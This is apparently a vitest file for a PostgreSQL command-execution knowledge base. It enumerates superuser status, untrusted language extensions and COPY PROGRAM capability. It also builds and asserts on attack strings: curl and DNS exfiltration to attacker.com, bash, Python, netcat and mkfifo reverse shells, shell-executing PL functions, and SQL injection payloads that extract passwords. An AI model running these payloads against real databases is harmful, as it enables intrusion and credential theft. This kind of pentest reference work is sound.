/**
 * PostgreSQL Command Execution Tests
 *
 * Tests for command execution capability detection.
 * Note: Actual command execution requires superuser - tests focus on enumeration.
 *
 * @kb-coverage postgresql/command-execution - Full coverage
 */

import os from "node:os";
import { describe, test, expect, beforeAll, afterAll } from "vitest";
import {
  initDirectRunner,
  cleanupDirectRunner,
  directSQL,
  directSQLExpectSuccess,
} from "../../src/runner/direct.js";
import { logger } from "../../src/utils/logger.js";

/**
 * Get the libc path for the current platform/architecture.
 * Returns null if no known path is available.
 */
function getLibcPath(): string | null {
  const platform = os.platform();
  const arch = os.arch();

  if (platform !== "linux") {
    return null; // libc.so paths only apply to Linux
  }

  // Map Node.js arch names to Linux lib directory names
  const archPaths: Record<string, string> = {
    x64: "/lib/x86_64-linux-gnu/libc.so.6",
    arm64: "/lib/aarch64-linux-gnu/libc.so.6",
    arm: "/lib/arm-linux-gnueabihf/libc.so.6",
  };

  return archPaths[arch] ?? null;
}

describe("PostgreSQL Command Execution", () => {
  beforeAll(async () => {
    logger.setLevel("warn");
    await initDirectRunner();
  }, 30000);

  afterAll(async () => {
    await cleanupDirectRunner();
  }, 10000);

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Privilege Checks
   */
  describe("Command execution privilege checks", () => {
    test("Check if current user is superuser", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('is_superuser') as is_super"
      );
      expect(["on", "off"]).toContain((rows[0] as { is_super: string }).is_super);
    });

    test("Check superuser status via pg_user", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT usesuper FROM pg_user WHERE usename = current_user"
      );
      expect(typeof (rows[0] as { usesuper: boolean }).usesuper).toBe("boolean");
    });

    test("Check pg_execute_server_program role membership", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT pg_has_role(current_user, 'pg_execute_server_program', 'member') as has_role"
      );
      expect(typeof (rows[0] as { has_role: boolean }).has_role).toBe("boolean");
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section PostgreSQL Version Check
   */
  describe("Version checks for COPY PROGRAM", () => {
    test("PostgreSQL version returns valid string", async () => {
      const { rows } = await directSQLExpectSuccess("SELECT version() as ver");
      expect((rows[0] as { ver: string }).ver).toMatch(/PostgreSQL/i);
    });

    test("Extract major version number", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('server_version_num')::int as ver_num"
      );
      // COPY PROGRAM requires 9.3+ (90300)
      expect((rows[0] as { ver_num: number }).ver_num).toBeGreaterThanOrEqual(90300);
    });

    test("Check server version setting", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('server_version') as ver"
      );
      expect((rows[0] as { ver: string }).ver).toBeTruthy();
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Untrusted Language Extensions
   */
  describe("Untrusted language extension checks", () => {
    test("Check for plpython3u extension", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM pg_extension WHERE extname = 'plpython3u'"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });

    test("Check for plperlu extension", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM pg_extension WHERE extname = 'plperlu'"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });

    test("Check for pltclu extension", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM pg_extension WHERE extname = 'pltclu'"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });

    test("List all untrusted language extensions", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT extname FROM pg_extension WHERE extname LIKE 'pl%u'"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });

    test("Check untrusted languages in pg_language", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT lanname FROM pg_language WHERE lanpltrusted = false AND lanname LIKE 'pl%'"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Available Extensions
   */
  describe("Available extension enumeration", () => {
    test("List available untrusted language extensions", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT name FROM pg_available_extensions WHERE name LIKE 'pl%u'"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });

    test("Check if plpython3u is available", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT * FROM pg_available_extensions WHERE name = 'plpython3u'"
      );
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section COPY Statement Checks
   */
  describe("COPY statement capability checks", () => {
    test("COPY requires specific privileges", async () => {
      // Create a test to verify COPY behavior
      const { success, error } = await directSQL("COPY (SELECT 1) TO PROGRAM 'echo test'");
      if (!success) {
        // Expected to fail without superuser
        expect(error?.message).toMatch(/permission denied|must be superuser/i);
      }
      expect(true).toBe(true);
    });

    test("Check COPY TO FILE privilege", async () => {
      const { success, error } = await directSQL("COPY (SELECT 1) TO '/tmp/test_copy.txt'");
      if (!success) {
        expect(error?.message).toMatch(/permission denied|must be superuser|could not open/i);
      }
      expect(true).toBe(true);
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Language Privilege Checks
   */
  describe("Language privilege enumeration", () => {
    test("Check privilege on plpgsql", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT has_language_privilege(current_user, 'plpgsql', 'usage') as can_use"
      );
      expect(typeof (rows[0] as { can_use: boolean }).can_use).toBe("boolean");
    });

    test("List all languages with usage privilege", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT lanname, has_language_privilege(current_user, lanname, 'usage') as can_use
        FROM pg_language
        WHERE lanispl = true
      `);
      expect(rows.length).toBeGreaterThan(0);
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Security Configuration
   */
  describe("Security configuration checks", () => {
    test("Check shared_preload_libraries setting", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('shared_preload_libraries') as libs"
      );
      expect(rows.length).toBe(1);
    });

    test("Check dynamic_library_path setting", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT current_setting('dynamic_library_path') as path"
      );
      expect((rows[0] as { path: string }).path).toBeTruthy();
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Function Creation Test
   */
  describe("Function creation capability", () => {
    test("Check if user can create functions", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT has_schema_privilege(current_user, 'public', 'create') as can_create
      `);
      expect(typeof (rows[0] as { can_create: boolean }).can_create).toBe("boolean");
    });

    test("List user-created functions", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT p.proname, l.lanname
        FROM pg_proc p
        JOIN pg_language l ON p.prolang = l.oid
        WHERE p.proowner = (SELECT oid FROM pg_roles WHERE rolname = current_user)
        LIMIT 10
      `);
      expect(rows.length).toBeGreaterThanOrEqual(0);
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section COPY PROGRAM Variations
   */
  describe("COPY PROGRAM variations", () => {
    test("COPY FROM PROGRAM captures multi-line output", async () => {
      await directSQL("CREATE TEMP TABLE IF NOT EXISTS multi_line_output (line TEXT)");

      const { success, error } = await directSQL(
        "COPY multi_line_output FROM PROGRAM 'printf \"line1\\nline2\\nline3\"'"
      );

      if (success) {
        const { rows } = await directSQLExpectSuccess("SELECT * FROM multi_line_output");
        expect(rows.length).toBe(3);
      } else {
        expect(error?.message).toMatch(/permission denied|must be superuser/i);
      }

      await directSQL("DROP TABLE IF EXISTS multi_line_output");
    });

    test("COPY FROM PROGRAM with pipe commands", async () => {
      await directSQL("CREATE TEMP TABLE IF NOT EXISTS pipe_output (line TEXT)");

      const { success } = await directSQL("COPY pipe_output FROM PROGRAM 'echo test | tr a-z A-Z'");

      // Either works or permission denied
      expect(typeof success).toBe("boolean");

      await directSQL("DROP TABLE IF EXISTS pipe_output");
    });

    test("COPY TO PROGRAM with shell redirection", async () => {
      const { success } = await directSQL(
        "COPY (SELECT 'redirected') TO PROGRAM 'cat > /tmp/redirect_test.txt'"
      );
      // Either works or permission denied
      expect(typeof success).toBe("boolean");
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section C Function Loading
   */
  describe("C function loading (system())", () => {
    test("CREATE FUNCTION from C requires superuser", async (context) => {
      const libcPath = getLibcPath();
      if (libcPath === null) {
        // Skip on non-Linux or unsupported architectures
        context.skip();
        return;
      }

      // Attempt to create C function - should fail without superuser
      const { success } = await directSQL(`
        CREATE OR REPLACE FUNCTION test_system(cstring) RETURNS int
        AS '${libcPath}', 'system'
        LANGUAGE C STRICT
      `);
      // Will fail - C is untrusted language
      expect(typeof success).toBe("boolean");
    });

    test("Check untrusted language creation privilege", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT rolsuper FROM pg_roles WHERE rolname = current_user"
      );
      // Only superusers can create C functions
      expect(typeof (rows[0] as { rolsuper: boolean }).rolsuper).toBe("boolean");
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Data Exfiltration Patterns
   */
  describe("Data exfiltration patterns", () => {
    test("Construct curl command for HTTP exfil", async () => {
      // Build the command string (not execute)
      const { rows } = await directSQLExpectSuccess(`
        SELECT 'curl http://attacker.com/?data=' || encode('secret'::bytea, 'base64') as cmd
      `);
      const cmd = (rows[0] as { cmd: string }).cmd;
      expect(cmd).toContain("curl");
      expect(cmd).toContain("c2VjcmV0"); // base64 of 'secret'
    });

    test("Construct nslookup command for DNS exfil", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT 'nslookup ' || encode('secret'::bytea, 'hex') || '.attacker.com' as cmd
      `);
      const cmd = (rows[0] as { cmd: string }).cmd;
      expect(cmd).toContain("nslookup");
      expect(cmd).toContain("736563726574"); // hex of 'secret'
    });

    test("Base64 encoding for exfil payloads", async () => {
      const { rows } = await directSQLExpectSuccess(
        "SELECT encode('sensitive data'::bytea, 'base64') as encoded"
      );
      const encoded = (rows[0] as { encoded: string }).encoded;
      expect(encoded).toBe("c2Vuc2l0aXZlIGRhdGE=");
    });

    test("URL-safe encoding for DNS subdomain", async () => {
      // DNS subdomains can't have special chars - use hex
      const { rows } = await directSQLExpectSuccess(
        "SELECT encode('test.data'::bytea, 'hex') as safe_label"
      );
      const label = (rows[0] as { safe_label: string }).safe_label;
      expect(label).toMatch(/^[0-9a-f]+$/);
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Reverse Shell Construction
   */
  describe("Reverse shell construction patterns", () => {
    test("Bash reverse shell command pattern", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT 'bash -c "bash -i >& /dev/tcp/' || '10.0.0.1' || '/' || '4444' || ' 0>&1"' as cmd
      `);
      const cmd = (rows[0] as { cmd: string }).cmd;
      expect(cmd).toContain("/dev/tcp/");
      expect(cmd).toContain("10.0.0.1");
    });

    test("Python reverse shell command pattern", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT 'python -c ''import socket,subprocess,os;' ||
               's=socket.socket();s.connect(("' || '10.0.0.1' || '",' || '4444' || '));' ||
               'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);' ||
               'subprocess.call(["/bin/sh","-i"])''' as cmd
      `);
      const cmd = (rows[0] as { cmd: string }).cmd;
      expect(cmd).toContain("socket.socket");
      expect(cmd).toContain("subprocess.call");
    });

    test("Netcat reverse shell pattern", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT 'nc -e /bin/bash ' || '10.0.0.1' || ' ' || '4444' as cmd
      `);
      const cmd = (rows[0] as { cmd: string }).cmd;
      expect(cmd).toContain("nc -e /bin/bash");
    });

    test("mkfifo reverse shell pattern", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' ||
               '10.0.0.1' || ' ' || '4444' || ' >/tmp/f' as cmd
      `);
      const cmd = (rows[0] as { cmd: string }).cmd;
      expect(cmd).toContain("mkfifo");
      expect(cmd).toContain("nc");
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section PL Language Function Templates
   */
  describe("PL language function templates", () => {
    test("PL/Python command function syntax", () => {
      // Verify the syntax is valid (won't execute without extension)
      const functionDef = `
        CREATE OR REPLACE FUNCTION cmd(cmd TEXT) RETURNS TEXT AS $$
        import subprocess
        return subprocess.check_output(cmd, shell=True).decode()
        $$ LANGUAGE plpython3u;
      `;
      // Just verify string construction
      expect(functionDef).toContain("plpython3u");
      expect(functionDef).toContain("subprocess");
    });

    test("PL/Perl command function syntax", () => {
      const functionDef = `
        CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
        my $cmd = shift;
        return \`$cmd\`;
        $$ LANGUAGE plperlu;
      `;
      expect(functionDef).toContain("plperlu");
    });

    test("PL/Tcl command function syntax", () => {
      const functionDef = `
        CREATE OR REPLACE FUNCTION cmd(TEXT) RETURNS TEXT AS $$
        return [exec $1]
        $$ LANGUAGE pltclu;
      `;
      expect(functionDef).toContain("pltclu");
    });
  });

  /**
   * @kb-entry postgresql/command-execution
   * @kb-section Injection Examples
   */
  describe("Injection command patterns", () => {
    test("Stacked query COPY TO PROGRAM pattern", async () => {
      // Build the injection payload (not execute)
      const { rows } = await directSQLExpectSuccess(`
        SELECT $$'; COPY (SELECT '') TO PROGRAM 'id'--$$ as payload
      `);
      expect((rows[0] as { payload: string }).payload).toContain("COPY");
      expect((rows[0] as { payload: string }).payload).toContain("TO PROGRAM");
    });

    test("PL/Python extension + function injection pattern", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT $$'; CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec(cmd TEXT) RETURNS TEXT AS $f$ import os; return os.popen(cmd).read() $f$ LANGUAGE plpython3u; SELECT exec('id')--$$ as payload
      `);
      expect((rows[0] as { payload: string }).payload).toContain("plpython3u");
    });

    test("DNS exfil injection pattern", async () => {
      const { rows } = await directSQLExpectSuccess(`
        SELECT $tag$'; COPY (SELECT '') TO PROGRAM 'nslookup ' || (SELECT encode(password::bytea,'hex') FROM users LIMIT 1) || '.attacker.com'--$tag$ as payload
      `);
      expect((rows[0] as { payload: string }).payload).toContain("nslookup");
    });
  });
});
